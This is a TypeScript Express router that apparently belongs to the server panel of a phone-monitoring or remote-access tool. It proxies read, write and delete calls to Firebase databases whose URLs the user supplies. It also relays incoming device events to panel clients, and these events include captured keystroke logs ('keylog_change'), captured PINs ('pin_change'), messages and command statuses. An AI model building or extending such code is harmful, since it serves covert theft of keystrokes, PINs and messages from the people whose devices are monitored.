import { Router, Request, Response } from 'express';
import { createClient } from '@supabase/supabase-js';
import { asyncHandler } from '../../middleware/errorHandler';
import { authenticate } from '../../middleware/auth';
import { firebaseService } from '../../services/firebase.service';
import config from '../../config/env';
import logger from '../../utils/logger';
import { io } from '../../index';
import { realtimeRegistry } from '../../services/realtimeRegistry';

const router = Router();
const supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);

/**
 * POST /api/v1/external/data
 * Fetch data from external Firebase database
 */
router.post('/data', authenticate, asyncHandler(async (req: Request, res: Response) => {
    let { databaseUrl, path, action = 'read', appId, data: writeData } = req.body;

    // Automatically resolve databaseUrl from appId if provided
    if (appId && !databaseUrl) {
        try {
            const { data: app } = await supabase
                .from('app_builder_apps')
                .select('database_provider_id')
                .eq('id', appId)
                .maybeSingle();

            if (app?.database_provider_id) {
                const { data: provider } = await supabase
                    .from('database_providers')
                    .select('config')
                    .eq('id', app.database_provider_id)
                    .maybeSingle();

                if (provider?.config) {
                    const config = provider.config as any;
                    databaseUrl = config.databaseUrl || config.url || config.firebase_url;
                }
            }
        } catch (err) {
            logger.error(err, `Failed to resolve appId ${appId}:`);
        }
    }

    if (!databaseUrl || !path) {
        // Special case for action: 'devices' which might not need a path if appId is provided
        if (action === 'devices' && appId) {
            // Forward to the devices listing logic
            return res.redirect(307, '/api/v1/cloud-phones/data/devices?appId=' + appId);
        }

        return res.status(400).json({
            success: false,
            error: 'databaseUrl and path required'
        });
    }

    try {
        const result = await firebaseService.proxy(
            action as 'read' | 'write' | 'delete',
            databaseUrl,
            path,
            writeData
        );

        return res.json({ success: true, data: result });
    } catch (error: any) {
        logger.error(error, 'External data fetch error');
        return res.status(500).json({ success: false, error: error.message });
    }
}));

/**
 * POST /api/v1/external/events
 * Receive real-time events from external providers (Relay)
 */
router.post('/events', asyncHandler(async (req: Request, res: Response) => {
    const { isBatch, events, type, data, source, apiKey } = req.body;

    // Security check: API key is REQUIRED
    if (!apiKey || apiKey !== process.env.EXTERNAL_NOTIFY_API_KEY) {
        logger.warn({ ip: req.ip, source }, 'Unauthorized external event attempt');
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }

    const eventsToProcess = isBatch && Array.isArray(events) ? events : [{ type, data, source }];

    for (const event of eventsToProcess) {
        const { type: eType, data: eData } = event;

        logger.debug(`[External Event] Type: ${eType}, Source: ${source}, Device: ${eData?.device_id}`);

        // Broadcast to main panel's clients via optimized Registry (Batched)
        if (eType === 'device_change') {
            realtimeRegistry.relayDeviceUpdate({ ...eData, app_id: eData.app_id });

            // Manual emit for app-specific room if not handled by registry
            if (eData.device_id && eData.app_id) {
                io.to(`app-${eData.app_id}`).emit('device_change', { eventType: 'UPDATE', new: eData });
            }
        } else if (eType === 'message_change') {
            realtimeRegistry.relayMessage({ ...eData, _source: source || 'external' });
        } else if (eType === 'command_status') {
            if (eData.device_id) {
                io.to(`device-${eData.device_id}`).emit('command_change', { eventType: 'UPDATE', new: eData });
            }
        } else if (eType === 'keylog_change') {
            if (eData.device_id) {
                io.to(`logs-${eData.device_id}`).emit('keylog_change', { eventType: 'INSERT', new: eData });
            }
        } else if (eType === 'pin_change') {
            if (eData.device_id) {
                io.to(`pins-${eData.device_id}`).emit('pin_change', { eventType: 'INSERT', new: eData });
            }
        }
    }

    return res.json({ success: true, processed: eventsToProcess.length });
}));



export default router;
